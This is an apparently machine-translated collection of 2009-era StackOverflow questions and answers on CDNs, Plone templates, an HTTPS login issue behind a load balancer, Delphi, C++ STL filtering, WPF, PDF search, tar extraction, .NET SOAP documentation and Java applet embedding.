# StackOverflow 问答 000651000-000651999

# hosting - 在决定使用内容交付网络 (CDN) 时，文件大小是否重要？

> ID：651008
> 
> 赞同：2
> 
> 时间：2009-03-16T15:50:11.457
> 
> 标签：hosting, cdn

我试图弄清楚使用 CDN 与在本地托管图像的有效性。假设我们的负载是这样的，与使用 CDN 相比，从托管 HTML 内容的同一服务器提供图像或 javascript 文件不会更慢，那么局部性在什么时候生效？

我对 CDN 工作原理的理解是，一个请求会转到文件的主 CDN 站点。该站点仅路由请求，因此它向（理论上）更靠近发出请求的用户的其他网络服务器发出重定向。

但是，与遭受更大延迟的一个请求相比，2 个 HTTP 请求和 2 个连接的开销实际上可能会增加开销。

我的问题是，有没有人有任何数字或文章说明在什么文件大小下减少延迟会产生很大的影响，并使其成为切换到 CDN 的明显选择？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T16:04:17.243

基于 Yahoo 的[YSlow](http://developer.yahoo.com/yslow/)工具和我所做的任何测试，跨主机拆分图像、css 和 javascript 是一个好主意，并且可以提高速度。

此外，如果您可以管理它，从不提供 cookie 的域提供静态内容也将提高速度。

来自 YSlow 的 Yahoo 开发人员帮助部分：http: [//developer.yahoo.com/performance/rules.html#cdn](http://developer.yahoo.com/performance/rules.html#cdn)

> “请记住，80-90% 的最终用户响应时间都花在了下载页面中的所有组件上：图像、样式表、脚本、Flash 等。这是性能黄金法则。而不是从重新设计的艰巨任务开始“您的应用程序架构，最好先分散您的静态内容。这不仅可以更大程度地减少响应时间，而且由于内容交付网络，它更容易。”

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-31T17:24:27.840

“地方性在什么时候生效？” 这在很大程度上取决于您的流量模式。可能是您在 X 国家/地区托管，并且您的大多数客户也在那里。CDN 可能不是正确的答案——您可能希望在应用程序前面有一个健壮的缓存层。

CDN 可以提供国内优势，例如更好的连接处理、减少到源的连接/请求/带宽、TCP 优化、DDoS 保护以及缓存（您在原始问题中没有提到）。但这一切都取决于您愿意支付的费用...

离您的原始客户越远，CDN 提供的好处就越明显。无论文件是小还是大，这都是一样的。

尝试一些在使用 CDN 时付费的真实世界测试，看看会发生什么。

# python - 如何使用 ZPT 检查它是否是 Plone 网站的主页？

> ID：651009
> 
> 赞同：3
> 
> 时间：2009-03-16T15:50:22.427
> 
> 标签：python, plone, zope, template-tal, zpt

如果不是主页，我只想更改我网站的标题。有*tal:condition*表达式吗？

我一直在阅读[这篇](http://plone.org/documentation/tutorial/zpt)文章，但找不到我要找的东西......

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-11-07T16:54:04.713

最好的方法是使用两个非常方便的克隆视图，它们仅用于此目的。定义它们的接口位于[https://svn.plone.org/svn/plone/plone.app.layout/trunk/plone/app/layout/globals/interfaces.py](https://svn.plone.org/svn/plone/plone.app.layout/trunk/plone/app/layout/globals/interfaces.py)，以备您查看。

```
<tal:block
   tal:define="our_url context/@@plone_context_state/canonical_object_url;
               home_url context/@@plone_portal_state/portal_url;"
   tal:condition="python:our_url == home_url">
HERE GOES YOUR STUFF
</tal:block> 
```

@@plone_context_state 和@@plone_portal_state 的伟大之处在于它们可以处理各种奇怪的边缘情况。context/@@plone_context_state/canonical_object_url 也返回正确的、最基本的对象的 url，即使您在门户根目录中查看附加了查询字符串的默认页面 :-)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-10-02T12:15:07.160

我使用类似于 ax 的东西：

```
<tal:block define="global currentUrl request/getURL" condition="python: u'home' not in str(currentUrl)">

<!-- whatever -->

</tal:block> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T18:56:57.390

`<tal:condition="python: request.URLPATH0 == '/index_html'`像...>`这样的东西怎么样？有关更多选择，请参阅[TALES 内置名称](http://docs.zope.org/zope2/zope2book/source/AppendixC.html#built-in-names)和[Zope API 参考](http://www.zope.org/Documentation/Books/ZopeBook/2_6Edition/AppendixB.stx)。

# php - 发布到 https 表单并不总是有效

> ID：651010
> 
> 赞同：1
> 
> 时间：2009-03-16T15:50:32.957
> 
> 标签：php, post, https

在我的网站上，我有一个简单的登录表单。该页面通过 HTTP 提供，但表单的 POST URL 是 HTTPS。

正常的方法是用户填写他们的用户名/密码，提交表单（到完全限定的 HTTPS URL，在同一站点上），然后 POST 处理执行 303 重定向到用户的主页。但有时这不会发生。

循环（这是 100% 可重复的）是这样的：

1.  访问登录表单，填写详细信息并提交
2.  在服务器上调用登录脚本，验证数据，然后，如果一切正常，执行 303 重定向到用户主页。
3.  然后我单击注销，然后单击登录，此时我将返回登录表单
4.  然后我再次填写我的详细信息，点击提交。
5.  然而，这一次，登录逻辑没有执行（在第 2 步记录登录的调试代码没有被调用），但我仍然被重定向到用户主页。但是因为我没有登录成功，所以被踢到首页了……

那么为什么 POST 不总是调用登录表单呢？我认为 303 没有被缓存（根据规范，它不应该被缓存）......

查看服务器中的 HTTPS 日志，第一次调用 login.phpo，但不是第二次......

**编辑：**

好的，我们已经解决了问题。对于那些感兴趣的人：

该站点在负载平衡器后面的 2 个网络服务器上运行。用户会话是“粘性的”——也就是说，一旦用户在一个 Web 服务器上浏览，LB 就会将它们“连接”到该服务器。这是通过 cookie 完成的。但是一旦我们切换到 HTTPS，LB 就无法读取 cookie，因为浏览器和 Web 服务器之间的连接是加密的。所以它在服务器之间交替。我们有代码在网络服务器之间传播登录身份验证，但这发生得不够快。所以发生的事情是：

1.  服务器 A 的用户浏览器，得到一个 cookie，上面写着“让我继续 A”，填写他们的登录凭据并点击提交
2.  LB 无法破译 HTTPS 流量（因此也无法破译 cookie），将 50% 的时间发送给 B
3.  B 验证登录并将用户设置为在会话中进行身份验证，然后将用户重定向到非 https 主页
4.  因为主页不是 https，LB 读取 cookie 并将它们发送给 A，A 对身份验证一无所知，因为它从 B 传播的速度不够快......

解决方案是允许 LB 解密 HTTPS 流量，从而确保用户确实停留在一个 Web 服务器上，而不管 HTTP/HTTPS 转换如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-17T06:41:11.270

> 我不认为 303 正在被缓存（根据规范，它不应该被缓存）......

不，浏览器不会缓存 303，但其他级别可能正在缓存它或序列中的其他页面。此外，假设您使用 cookie 存储登录状态，您需要确保设置“路径”和“域”，以便设置和删除相同的 cookie，而不是站点不同部分的多个影子副本.

诊断需要更多代码。

> 该页面通过 HTTP 提供，但表单的 POST URL 是 HTTPS。

不要那样做。如果不手动查看源（并检查引用的每个脚本），用户就无法知道“操作”URL 将是 HTTPS，这不会发生。

因此，中间人攻击者可以通过简单地使用登录表单更改初始 HTTP 页面来获取身份验证详细信息。这使得对 POST 接收器的任何保护完全没有意义。

登录过程的每个阶段，包括任何包含登录表单的页面，都必须使用 HTTPS，您才能从中受益。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:34:12.317

您如何“注销”您是否尝试过清除缓存以查看是否有任何剩余的会话变量将其丢弃？

在 Firefox 中：工具 -> 清除私有数据 -> 检查缓存、Cookie 和经过身份验证的会话

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:57:56.960

Seems like it must be a caching issue, I would think. I'd set the headers on the pages so that you're explicitly not caching anything, and see how that works.

Second guess is that you have a session/ cookie issue (admittedly, I haven't thought through how this would work). In your logout page, do you explicitly destroy the session (and any non-permanent cookies on the client)?

Finally, are you using any server side caching? I don't think a PHP opcode cache would exhibit this behavior, but I've seen stranger things with memcache (and, if you're using a framework, each framework caches a little differently).

# delphi - 在 Delphi 中捕获 F10

> ID：651011
> 
> 赞同：1
> 
> 时间：2009-03-16T15:50:43.063
> 
> 标签：delphi

我试图`F10`在 Delphi 中捕获密钥，但它似乎继续激活菜单，因为它从 vk_F10 转换为 vk_menu 或其他东西。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T16:02:56.187

添加到我的主窗体的以下 OnKeyDown 事件应该可以工作。请注意，您需要将 key 参数设置为零以防止菜单激活：

```
procedure TForm1.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
   if key = VK_F10 then begin
     Label1.Caption := 'You hit F10';
     key := 0;
   end;
end; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T15:54:25.833

如果你在 Windows 上，这里有一些使用 Windows API 制作键盘钩子的代码：http: [//www.delphitricks.com/source-code/windows/install_a_keyboard_hook.html](http://www.delphitricks.com/source-code/windows/install_a_keyboard_hook.html)

# c++ - 返回映射中匹配条件的一组键

> ID：651012
> 
> 赞同：1
> 
> 时间：2009-03-16T15:50:43.097
> 
> 标签：c++, stl

首先我将给出一个具体案例，我想看看它是否可以应用于一般问题。

说我有地图。我想让所有的钥匙都满足一定的标准。例如所有包含“COL”的键。我天真的实施将是

```
template<typename T>
void  Filter (map<string, T> & m, std:set<string> & result, const std::string& condition)
{
    for(map<string,string> iter=m.begin();iter!m.end();iter++)
    {
           std::string key=iter->first; 
           size_t found=key.find(condition);
           if (found!=string::npos)
              result.insert(key);
    }     

} 
```

实现这个的好方法是什么？

另外，当我想使用算法过滤地图时，什么是实现一般问题的好方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T16:31:07.240

这看起来像是`remove_copy_if`. 我写了一些`boost`看起来很恶心的东西，但提供了你算法的概括。

```
#include <boost/iterator/transform_iterator.hpp>
#include <boost/bind.hpp>
#include <boost/function.hpp>
#include <algorithm>
#include <map>
#include <set>
#include <string>

struct filter_cond : std::unary_function<std::string, bool> {
    filter_cond(std::string const &needle):needle(needle) { }
    bool operator()(std::string const& arg) {
        return (arg.find(needle) == std::string::npos);
    }
    std::string needle;
};

int main() {
    std::set<std::string> result;
    typedef std::map<std::string, int> map_type;
    map_type map;

    std::remove_copy_if(
        boost::make_transform_iterator(map.begin(),
                                       boost::bind(&map_type::value_type::first, _1)),
        boost::make_transform_iterator(map.end(),
                                       boost::bind(&map_type::value_type::first, _1)),
        std::inserter(result, result.end()), 
        filter_cond("foo")
    );
} 
```

我可能更喜欢手动循环。C++1x 将使用 lambda 表达式使外观变得更好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T16:10:19.303

> 实现这个的好方法是什么？

看看下面。这是未经测试的东西，所以你可能需要修复它。

```
/* return some value */
/* fix order of input and output instead of having them mixed */
template<typename T>
size_t Filter(map<string, T> m, 
             string const& condition /* fixed condition; mark it as such */
             set<T>& result /* reference to add efficiency */
             )
{
  typename map<string, T>::const_iterator last = m.end();
  typename map<string, T>::const_iterator i = find_if(m.begin(),
                                             last,
                                             bind2nd(equal(), condition)
                                            );
  while (i != last) {
       result.insert(*i);
       i = find_if(i + 1,
                   last,
                   bind2nd(equal(), condition)
                   );
  }
  return result.size(); 
```

}

> 另外，当我想使用算法过滤地图时，什么是实现一般问题的好方法？

看看[`std::transform`](http://www.sgi.com/tech/stl/transform.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:15:21.787

首先，一些非常小的建议：

*   您可以缓存 m.end() 的值
*   您可以使用`++iter`，它会为您节省一份迭代器
*   您可以通过将测试移动到一个非常明确命名的函数来提高清晰度，例如 ''KeyContainsSubstring(const std::string&)'' 或类似的。

在对这类任务进行更一般的处理时，我实际上倾向于像你一样更喜欢显式循环。std::map 无论如何都没有提供更有效的键迭代机制。

替代方案包括[`std::for_each`](http://www.cplusplus.com/reference/algorithm/for_each.html)与[`boost::bind`](http://www.boost.org/doc/libs/1_38_0/libs/bind/bind.html)、 或结合[`boost::lambda`](http://www.boost.org/doc/libs/1_38_0/doc/html/lambda.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T16:18:13.327

我认为您的解决方案相当不错：很清楚，除非您可以根据条件“猜测”哈希值，否则我认为您的性能不会更高。但是，您可以更改函数以使其更通用：

```
template<typename TKey, typename TValue, typename Predicate>
void filter (const map<TKey, TValue> & m, 
             set<TKey> & result, 
             Predicate & p)
{
    typename map<TKey,TValue>::const_iterator it = m.begin();
    typename map<TKey,TValue>::const_iterator end = m.end();

    for( ; it != end ; ++it)
    {
        TKey key = it->first;
        if (p(key))
            result.insert(key);
    }     
} 
```

然后可以使用函子作为谓词编写您的示例：

```
struct Contains {
    Contains(const string & substr) : substr_(substr) {}

    bool operator()(const string & s)
    {
        return s.find(substr_) != string::npos;
    }

    string substr_;
}; 
```

对过滤器的调用将如下所示：

```
map<string, Obj> m;
// Insert in m
set<string> res;
filter(m, res, Contains("stringToFind")); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T17:28:49.053

你也可以这样做：

```
template<class T>
struct StringCollector
{
public:
    StringCollector(const std::string& str, std::set<std::string>& selectedKeys) : m_key(str), m_selectedKeys(selectedKeys)
    {

    }

    void operator()(const std::pair<std::string,T>& strPair_in)
    {
        size_t found = strPair_in.first.find(m_key);
        if(found != std::string::npos)
        {
            m_selectedKeys.insert(strPair_in.first);
        }
    }

private:
    std::set<std::string>& m_selectedKeys;
    std::string m_key;
}; 
```

在调用代码中：

```
std::set<std::string> keys;
StringCollector<int> collector("String",keys);
std::for_each(a.begin(), a.end(), collector); 
```

# wpf - 为什么要在 XAML Window.Loaded 调用的方法中运行代码？

> ID：651013
> 
> 赞同：8
> 
> 时间：2009-03-16T15:50:46.667
> 
> 标签：wpf, architecture, cross-platform, conceptual

我看到了一个代码示例，它创建了一个`Window_Loaded()`由 XAML 的“加载窗口”事件调用的方法：

```
<Window x:Class="TestModuleLoader.Window1"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Window1" Height="300" Width="300" Loaded="Window_Loaded">
    <Grid>
        ...
    </Grid>
</Window> 
```

但在后面的代码中，代码在构造函数和`Window_Loaded()`方法中都有效：

```
using System.Windows;

namespace TestModuleLoader
{
    public partial class Window1 : Window
    {
        public Window1()
        {
            InitializeComponent();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            //what advantages do I have running code here? 
        }
    }
} 
```

这样做有什么好处吗？

是否有像 ASP.NET 中那样的“窗口加载周期”，这有助于了解，例如`PreRender()`，`PostRender()`等方法？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-03-16T15:58:28.367

是的，WPF 控件也有类似的生命周期，就像在 ASP.NET 中一样。WPF 控件的生命周期更简单，因为它基本上由初始化、加载和卸载事件（按此顺序）组成。看：

[http://msdn.microsoft.com/en-us/library/ms754221.aspx](http://msdn.microsoft.com/en-us/library/ms754221.aspx)

Mike Hillberg 有一篇很好的文章，展示了初始化事件和加载事件之间的区别：

[http://blogs.msdn.com/mikehillberg/archive/2006/09/19/LoadedVsInitialized.aspx](http://blogs.msdn.com/mikehillberg/archive/2006/09/19/LoadedVsInitialized.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T16:43:27.400

优秀的链接，拉齐。

Edward - 您会发现最有趣的区别是，Contructor 始终是在您的 Window/Page/UserControl 上调用的第一个方法，并且您不能指望所有 DependencyProperties 都已初始化为其最终值。此外，不建议从您的构造函数中调用任何虚拟方法。

相比之下，Loaded 事件通常在初始化过程结束时调用......也就是说 - 当 Window/Page/UserControl 已完全加载到 WPF ElementTree 中时。在加载的事件中，您可以自信地调用任何方法并修改任何 DepenencyProperty，而不会出现意外结果的风险。

一个很好的模式（我目前在我的项目中使用）是在 Loaded 事件中初始化自定义依赖项属性，*如果*它们在初始化期间没有被修改。对于控件，如果它们被覆盖（即通过调用代码中的属性绑定），此模式允许您避免初始化“昂贵的”属性（如 DependencyProperty，它是 ObservableCollection）。

简单的答案：如果您不确定如何安全地重载构造函数，请使用 Loaded 事件。

# design-patterns - 本地与集中处理

> ID：651015
> 
> 赞同：3
> 
> 时间：2009-03-16T15:51:41.470
> 
> 标签：design-patterns, architecture, distributed, local, thick-client

我在一家拥有大量 SAP 投资的公司工作，我们还有数十个大型 .Net 系统（主要用于内部工程系统）和 Java 平台（主要用于外部 Web 应用程序）。因此，我们在 ABAP、C# 和 Java EE 上有大型开发商店。

我们有 20 多个主要设施分布在很远的距离、2 个数据中心和 600 个左右的小型设施，分布在城市、农村和偏远地区（想想靠近北极）

对于在每个功能域中使用哪个平台，我们有很好的标准，但是对于何时使用本地处理以及何时使用分布式（中央）处理，我们并不清楚。（即，胖客户端与瘦客户端）

我想根据最佳实践构建一个决策树来帮助解决这个问题。我过去看到的一些标准包括：

*   将安装应用程序的任何地方都有可靠的网络吗？（如果不是，本地处理可能是更好的选择）
*   应用程序是否需要实时数据？（如果是，集中处理可能是更好的选择）
*   应用程序是否需要密集的 CPU 工作或高磁盘 IO？（如果是，集中处理或密集的本地处理可能是选项）
*   应用程序是否需要离线功能？（如果是，本地处理可能是更好的选择）
*   在远程环境中整合数据是否存在安全问题？（如果是，使用分布式瘦客户端进行集中处理可能是更好的选择）
*   站点上是否有可用于运行应用程序的现有硬件？（如果是，集中处理可能是一个不错的选择：瘦客户端的部署和维护成本更低，它们更安全，对窃贼而言价值更低）
*   是否存在同一个用户组正在使用的现有应用程序，这些应用程序是如何部署的？（通过将应用程序整合到一种设计模式中可能会产生规模经济）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-29T14:47:34.810

这里可以考虑各种事情，例如您要使用哪种文件系统？(AFS/NFS)

根据以前的经验，我们已经成功地分发了需要密集 CPU 而非远程服务器的 citrix 集群的交易系统。这些用户都没有任何抱怨。

实时数据我们通常会使用 BUS 方法，由客户端或中间件提供结果。

# pdf - 无法将 pdf 文件转换为我可以搜索的 pdf 文件

> ID：651017
> 
> 赞同：2
> 
> 时间：2009-03-16T15:51:55.510
> 
> 标签：pdf

如何将包含文本的 pdf 文件转换为我可以搜索的文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T15:57:37.120

我记得前段时间曾使用[Apache Lucene在来自 Java 的不同类型文档中执行搜索，其中包括 PDF 和 Word 文件。](http://lucene.apache.org/java/docs/)

但是，这个问题完全取决于您使用的编程语言，因此如果您不使用 Java，您可能需要指定它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T15:58:31.843

您可以通过 Adob​​e Reader 搜索 PDF。

编程上，您也许可以通过[iText](http://www.lowagie.com/iText/)搜索它。它可以作为 Java 和 .NET 库使用。

我相信您会使用[pdf 解析器](http://www.1t3xt.info/api/com/lowagie/text/pdf/parser/package-summary.html)类。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T16:12:06.320

我相信[TallPDF](http://www.tallpdf.net)允许提取文本。

# linux - 使用单个命令打开 .tar.gz 文件

> ID：651018
> 
> 赞同：44
> 
> 时间：2009-03-16T15:52:14.153
> 
> 标签：linux, gzip, tar, gunzip

当我下载 .tar.gz 文件时，我使用两个命令打开它，首先是`gunzip`.tar.gz `tar`。

是否可以只用一个命令打开它？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2009-03-16T15:54:09.110

```
tar xzf file.tar.gz 
```

这些字母是：

*   x - 提取
*   z - gunzip 输入
*   f - 从文件中读取，而不是标准输入

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-03-16T15:54:33.570

您可以将 tar 与“z”参数一起使用

```
tar xvfz mytar.tar.gz 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T17:27:34.437

如果您没有 gnu tar，仍然可以使用管道在一个步骤中打开文件（尽管技术上仍然是两个命令）

```
zcat file.tar.gz |tar x 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-08-08T14:13:30.747

> 我唯一要补充的是 z 通常只适用于 gnu tar。至少在我的经验中，典型的 UNIX tar 不会有这个。– 乔恩 3 月 16 日 16:19

z 选项也适用于我的[OS X v10.5](https://en.wikipedia.org/wiki/Mac_OS_X_Leopard) (Leopard)。

在记忆方面，我认为很容易想到你想要什么，而不仅仅是一些字母。

1.  如果要创建存档，则**c**将是第一个选项，否则 x 将是第一个选项，如果您想 e **x** tract。
2.  如果你想用 g **z** ip/gun **z** ip 程序压缩/解压缩，那么下一个选项应该是 z for zip。（所有以 .gz 结尾的档案都必须使用 z 选项解压缩）
3.  最后一个强制选项是文件的 f。

然后你通常会得到这两个命令：

*   tar czf file.tar.gz /folder_to_archive/*
*   tar xzf 文件.tar.gz

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-03-26T02:52:25.580

**如何提取一个gz文件？**

使用 guzip 命令如下：

```
gunzip file.gz 
```

*或者*

```
gzip -d file.gz 
```

**如何提取 tar.gz 或 .tgz 文件？**

扩展名为 tar.gz 或 .tgz 的文件是使用 gzip 压缩的 tar 文件。在 Unix 系统上使用以下命令提取它们：

```
gunzip < file.tar.gz | tar xvf -
gunzip < file.tgz | tar xvf - 
```

如果你有 GNU tar（Linux 系统），你可以直接使用 z 选项：

```
tar xvzf file.tar.gz
tar xvzf file.tgz 
```

要了解更多信息，请参阅*[Linux/UNIX 命令打开 .gz 文件](http://www.cyberciti.biz/faq/howto-compress-expand-gz-files/)*。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-09-09T16:31:42.983

在 Windows 上，尝试使用[tartool](http://tartool.codeplex.com/)实用程序。

它是免费的，代码是开源的，并使用 SharpZipLib 库。

免责声明：我是此实用程序的作者。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-07-02T16:58:36.100

从 tar 文件压缩文件中解压单个文件

要从 video.tar 中提取名为 video.mpeg 的单个文件，请使用以下命令，如下例所示。

```
# tar -xvf video.tar video.mpeg 
```

视频.mpeg

从 tar.gz 文件中提取单个文件

使用以下命令从 websitecode.tar.gz 存档文件中提取单个文件 codefile.xml

```
# tar -zxvf websitecode.tar.gz code.xml 
```

代码.xml

从 tar.bz2 文件中提取单个文件

使用命令从 websitecode.tar.bz2 中提取单个文件 file.html

```
# tar -jxvfwebsitecode.tar.bz2 home/website/file.html 
```

/home/website/file.html

您还可以在此链接中阅读有关所有 tar 命令的更多信息，[解释 linux 中可用的所有有用 tar 命令](http://www.pagalparrot.com/useful-tar-commands-example-in-linux-to-setup-server-using-ssh-2/)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-10-12T07:46:11.543

*如今* `tar`，如果需要，会自动解压缩。写下就足够了：

```
tar xf file.tar.gz 
```

助记符：e **x** tract**文件**

# .net - 如何在 .Net 中为 SOAP/WebService 类生成 HTML 文档？

> ID：651029
> 
> 赞同：4
> 
> 时间：2009-03-16T15:54:13.010
> 
> 标签：.net, soap, wsdl

当您在 VisualStudio(VS) 中启动 WebService 项目时，您确实会看到一些 HTML 文档，但 C# 注释帮助不会将其传递到 HTML。您可以使用 WebMethod 特性的 Description 属性为每个 Web 方法获取描述，但这意味着从注释帮助中复制文本，并且据我所知也不允许记录 Web 方法参数。

有没有一种简单的方法来获取 C# 代码中已经存在的注释帮助？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T16:05:04.340

C# 注释不会编译到程序集中。[Codeproject](http://www.codeproject.com/KB/XML/webservicedoc.aspx)有一个提供备用 WSDL 文档的解决方案：设置一个 ASP.NET 应用程序来读取原始 xml 文档文件应该不会太难，并通过一些配置将 WSDL 服务和操作与类和方法相匹配。

不过，我不知道您的问题是否有现成的解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-06-29T13:04:22.380

我们现在使用 WCFExtra 库将我的代码中的 XML 注释转换为 WSDL 中的文档注释。

从那里我们使用 TechWriter 来构建文档。

# java - Java Applet 中的 ClassNotFoundException 使用 tag I'm trying to embed a Java Applet using the <OBJECT> tag, which is the XHTML Strict way of doing it. After browsing lots of sites, I tried 问问题

> ID：651032
> 
> 赞同：1
> 
> 时间：2009-03-16T15:54:37.953
> 
> 标签：java, xhtml, applet

I'm trying to embed a Java Applet using the <OBJECT> tag, which is the XHTML Strict way of doing it.

After browsing lots of sites, I tried [this example](http://ww2.cs.fsu.edu/%7Esteele/XHTML/appletObject.html) which seems to work pretty well:

```
<!--[if !IE]> Firefox and others will use outer object -->
  <object classid="java:Sample2.class" 
          type="application/x-java-applet"
          archive="Sample2.jar" 
          height="300" width="450" >
    <!-- Konqueror browser needs the following param -->
    <param name="archive" value="Sample2.jar" />
  <!--<![endif]-->
    <!-- MSIE (Microsoft Internet Explorer) will use inner object --> 
    <object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" 
            codebase="http://java.sun.com/update/1.5.0/jinstall-1_5_0-windows-i586.cab"
            height="300" width="450" > 
      <param name="code" value="Sample2" />
      <param name="archive" value="Sample2.jar" />
      <strong>
        This browser does not have a Java Plug-in.
        <br />
        <a href="http://java.sun.com/products/plugin/downloads/index.html">
          Get the latest Java Plug-in here.
        </a>
      </strong>
    </object> 
  <!--[if !IE]> close outer object -->
  </object>
  <!--<![endif]--> 
```

I downloaded that Sample2.jar and works perfectly on localhost.

Now, I replaced Sample2.class for the one I need to use (ar.uba.exactas.infovis.ivides.Scatterplot.class) and using my own JAR files (archive="piccolo.jar piccolox.jar netscape.jar scatterplot.jar"):

```
<!--[if !IE]> Firefox and others will use outer object -->
<object
    classid="java:ar.uba.exactas.infovis.ivides.Scatterplot.class"
    type="application/x-java-applet"
    archive="piccolo.jar piccolox.jar netscape.jar scatterplot.jar"
    height="300" width="450" >
    <!-- Konqueror browser needs the following param -->
    <param name="archive" value="piccolo.jar piccolox.jar netscape.jar scatterplot.jar" />
<!--<![endif]-->
    <!-- MSIE (Microsoft Internet Explorer) will use inner object -->
    <object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93"
                    codebase="http://java.sun.com/update/1.5.0/jinstall-1_5_0-windows-i586.cab"
                    height="300" width="450" >
        <param name="code" value="ar.uba.exactas.infovis.ivides.Scatterplot" />
        <param name="archive" value="piccolo.jar piccolox.jar netscape.jar scatterplot.jar" />
        <strong>
            This browser does not have a Java Plug-in.
            <br />
            <a href="http://java.sun.com/products/plugin/downloads/index.html">
                Get the latest Java Plug-in here.
            </a>
        </strong>
    </object>
<!--[if !IE]> close outer object -->
</object>
<!--<![endif]--> 
```

After doing so, I'm gettin this log dump:

```
java.lang.ClassNotFoundException: ar.uba.exactas.infovis.ivides.Scatterplot.class
    at sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)
    at sun.plugin2.applet.Plugin2Manager.createApplet(Unknown Source)
    at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)
    at java.lang.Thread.run(Unknown Source)
Caused by: java.io.IOException: open HTTP connection failed:http://localhost/infovisUBA/2008-2C/tpfinal/bin/ar/uba/exactas/infovis/ivides/Scatterplot/class.class
    at sun.plugin2.applet.Applet2ClassLoader.getBytes(Unknown Source)
    at sun.plugin2.applet.Applet2ClassLoader.access$000(Unknown Source)
    at sun.plugin2.applet.Applet2ClassLoader$1.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    ... 7 more
Excepción: java.lang.ClassNotFoundException: ar.uba.exactas.infovis.ivides.Scatterplot.class 
```

The only difference I see is that I'm using a class inside a package.

Also, please note I did make this work using the <APPLET> tag, but I cannot make it with <OBJECT>.

Any clue?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T15:58:38.847

你有没有写过这个：

```
<param name="code" 
       value="ar.uba.exactas.infovis.ivides.Scatterplot.class" />
<param name="archive"
       value="piccolo.jar piccolox.jar netscape.jar scatterplot.jar" /> 
```

代替：

```
<param name="code"
       value="ar.uba.exactas.infovis.ivides.Scatterplot" />
<param name="archive"
       value="piccolo.jar piccolox.jar netscape.jar scatterplot.jar" /> 
```

不同之处在于代码值末尾缺少“.class”。从例子来看，它应该在`classid`属性的末尾，而不是在`code`参数值的末尾。

这就是堆栈跟踪向我建议的内容：

```
Excepción: java.lang.ClassNotFoundException: 
    ar.uba.exactas.infovis.ivides.Scatterplot.class 
```

我不希望在类名的末尾看到“.class”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T16:28:01.290

If it's not what Jon Skeet suggested, then check your JAR file manifests and ensure that your main class reference doesn't end in ".class". The Exception:

```
Excepción: java.lang.ClassNotFoundException: 
  ar.uba.exactas.infovis.ivides.Scatterplot.class 
```

indicates that somehow, you're telling Java to run `ar.uba.exactas.infovis.ivides.Scatterplot.class` instead of `ar.uba.exactas.infovis.ivides.Scatterplot`. You just have to find where this is occurring.

Also notice in the middle of the Exception dump, the following complaint (wrapped by me):

```
Caused by: java.io.IOException:
 open HTTP connection failed:
 http://localhost/infovisUBA/2008-2C/tpfinal/
        bin/ar/uba/exactas/infovis/ivides/Scatterplot/class.class 
```

it is somehow trying to load the wrong class ... you have an extra `".class"` or `"/class"` somewhere in your HTML. Just to try this, if you have not already tried this, replace

```
classid="java:ar.uba.exactas.infovis.ivides.Scatterplot.class" 
```

with

```
classid="java:ar.uba.exactas.infovis.ivides.Scatterplot" 
```

Also, do you get the same Exception in both browsers?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-23T12:22:19.607

I'm having the same problem with my applet. It runs fine from IE, but fails with ClassNotFoundException. The error message indicates, that the Firefox java plugin tries to download the class file from the server separately, and not from the supplied jar file.

I found out, that in Firefox, the order of the archive and code attributes matters. My original spec was:

applet name="XYZ" code="x.y.Applet" archive="xxx.jar" codebase="" width='100%' height='100%' mayscript="mayscript"

I changed the order to:

applet name="XYZ" archive="xxx.jar" code="x.y.Applet" width='100%' height='100%' mayscript="mayscript"

And it works now.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-26T17:42:46.583

Well, this was a hard one...

Struggled a lot of time but finally found that the problem was Opera itself. I was using an alpha version which had this bug. Now it works great!

